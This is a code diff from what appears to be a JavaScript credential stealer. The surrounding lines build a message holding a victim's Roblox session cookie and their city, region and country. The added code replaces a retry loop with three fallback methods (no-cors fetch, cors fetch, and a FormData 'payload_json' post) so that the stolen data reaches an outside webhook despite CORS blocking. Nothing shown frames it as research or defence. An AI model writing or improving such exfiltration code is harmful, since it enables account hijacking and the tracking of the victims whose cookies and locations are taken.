@@ -273,39 +273,64 @@ Cookie: ${robloxCookie || 'None found'}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
 
-        // Retry mechanism for webhook calls
+        // Try multiple approaches to bypass CORS restrictions
         let response;
-        let attempts = 0;
-        const maxAttempts = 3;
+        let success = false;
         
-        while (attempts < maxAttempts) {
-            attempts++;
+        // Method 1: Try with no-cors mode (won't get response but will send)
+        try {
+            console.log('Attempting webhook delivery with no-cors mode...');
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload),
+                mode: 'no-cors'
+            });
+            
+            // If no error thrown, assume success (can't read response in no-cors)
+            response = { ok: true, status: 204 };
+            success = true;
+            console.log('Webhook sent successfully via no-cors mode');
+            
+        } catch (noCorsError) {
+            console.log('No-cors method failed, trying cors mode...', noCorsError);
+            
+            // Method 2: Try with CORS mode as fallback
             try {
                 response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
-                        'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`
+                        'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload),
                     mode: 'cors'
                 });
+                success = true;
+                console.log('Webhook sent successfully via cors mode');
                 
-                if (response.ok) {
-                    break; // Success, exit retry loop
-                } else if (response.status === 429 && attempts < maxAttempts) {
-                    // Rate limited, wait and retry
-                    await new Promise(resolve => setTimeout(resolve, 5000));
-                    continue;
-                } else {
-                    break; // Other error, don't retry
+            } catch (corsError) {
+                console.log('CORS method failed, trying alternative approach...', corsError);
+                
+                // Method 3: Try using a simple form approach
+                try {
+                    const formData = new FormData();
+                    formData.append('payload_json', JSON.stringify(payload));
+                    
+                    response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        body: formData,
+                        mode: 'no-cors'
+                    });
+                    success = true;
+                    response = { ok: true, status: 204 };
+                    console.log('Webhook sent successfully via form method');
+                    
+                } catch (formError) {
+                    console.error('All webhook methods failed:', formError);
+                    throw new Error(`All webhook delivery methods failed. CORS restrictions may be blocking the request.`);
                 }
-            } catch (fetchError) {
-                if (attempts === maxAttempts) {
-                    throw fetchError;
-                }
-                // Wait before retry
-                await new Promise(resolve => setTimeout(resolve, 2000));
             }
         }
         
